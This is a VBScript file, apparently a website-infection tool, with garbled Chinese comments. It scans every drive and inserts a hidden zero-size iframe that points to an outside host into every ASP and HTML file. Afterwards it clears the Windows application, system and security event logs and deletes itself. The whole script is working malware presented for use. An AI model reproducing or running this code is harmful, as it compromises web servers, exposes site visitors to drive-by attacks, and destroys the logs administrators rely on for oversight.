   dim Modify,Modifyd,objArg
   dim n,i
   on error resume next
   DIM objShell
   set objShell=wscript.createObject("wscript.shell")
   Set ArgObj = WScript.Arguments
           ScriptHost = WScript.FullName
           ScriptHost = Right(ScriptHost, Len(ScriptHost) - InStrRev(ScriptHost, "\"))
   If ucase(scripthost)<>"CSCRIPT.EXE" Then
   iReturn=objShell.Run("cscript.exe "+WScript.ScriptName, 1, TRUE)
   iReturn=objShell.Run("c:\cscript.exe "+WScript.ScriptName, 1, TRUE)
   WScript.Quit 1
   end if

   Modify="</body>"'Ìæ»»Ç°µÄ×Ö·û
   Modifyd="<iframe src=""http://fuckty.go.3322.org"" width=0 height=0></iframe></body>"'ÒªÌæ»»³ÉµÄ¶«¶«
   Set objArg = Wscript.Arguments
   If objarg.Count<1 Then
   N=67
   Do while n<91
   wscript.echo chr(n)+":"
   bianli(chr(n)+":\")
   n=n+1
   loop
   Else
   bianli(objarg(0))
   End If

   'ÏÂÃæ¿ªÊ¼ÇåÈÕÖ¾
   strComputer= "."
   Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate,(Backup)}!\\" & _
    strComputer & "\root\cimv2")
   dim mylogs(3)
   mylogs(1)="application"
   mylogs(2)="system"
   mylogs(3)="security"
   for Each logs in mylogs
   Set colLogFiles=objWMIService.ExecQuery _
    ("Select * from Win32_NTEventLogFile where LogFileName='"&logs&"'")
   For Each objLogfile in colLogFiles
    objLogFile.ClearEventLog()
   Next
   next
   'ÏÂÃæÉ¾³ý½Å±¾×ÔÉí
   Set fso = CreateObject("Scripting.FileSystemObject")
   f = fso.DeleteFile(WScript.ScriptName)



   Function bianli(path)
   on error resume next
   set fso=CreateObject("scripting.filesystemobject")
   Set objFolder=fso.GetFolder(path)
   Set objSubFolders=objFolder.Subfolders
   For each objSubFolder in objSubFolders
   nowpath=path + "\" + objSubFolder.name
   Set objFiles=objSubFolder.Files
   For each objFile in objFiles

   If right(ucase(objfile),4)=".ASP" or right(ucase(objfile),4)=".HTM" or right(ucase(objfile),5)=".HTML" Then
   Repla(objfile)
   End if

   Next
   bianli(nowpath)
   Next
   Set objFolder=nothing
   Set objSubFolders=nothing
   Set fso=nothing
   End function

   function Repla(File)
   on error resume next
   Set fileSysObj = createObject("Scripting.FileSystemObject")
   Set tf = filesysobj.OpenTextFile(File, 1)
   read=tf.Readall
   tf.Close
   If instr(read,modifyd)>1 then
   wscript.echo file+"    Ready OK!!!!!"
   exit function
   end if
   read=replace(read,"<iframe src=""http://img.wagglewaggle.net/community/counter"" width=0 height=0></iframe></body>","<iframe src=""http://fuckty.go.3322.org"" width=0 height=0></iframe></body>")
   if instr(read,modify)=0 then
   wscript.echo file+"    Not Found "+modify+" !!!!!"
   exit function
   end if
   read=replace(read,modify,modifyd)
   Set fileSysObj = createObject("Scripting.FileSystemObject")
   Set tf = filesysobj.OpenTextFile(file, 2)
   tf.write read
   tf.Close
   wscript.echo file+"   OK!!!!!"
   End function
